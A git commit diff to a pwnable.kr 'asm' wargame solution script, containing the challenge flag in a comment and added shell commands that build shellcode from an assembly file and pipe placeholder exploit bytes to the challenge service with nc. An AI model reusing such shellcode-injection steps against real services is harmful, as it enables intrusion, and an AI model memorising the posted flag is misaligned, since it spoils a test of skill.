0262f15319def4f356acc56aa6aa7507aa5e5e1c
Gergely Bod <bodgergely@hotmail.com>
2018-07-04 11:29:44 -0400

    sol

--- pwnable_kr/asm/solution.sh
+++ pwnable_kr/asm/solution.sh
@@ -1,2 +1,5 @@
 # create the shellcode in binary form and inject into nc 0 9026
 # flag: Mak1ng_shelLcodE_i5_veRy_eaSy
+python3.6 ../../shellcode/shellcode.py assembly/read_write_file.s > exploit_str
+cat exploit_str | cs
+python2 -c "print 'REPLACE THIS WITH THE EXPLOIT BYTES'" | nc 0 9026
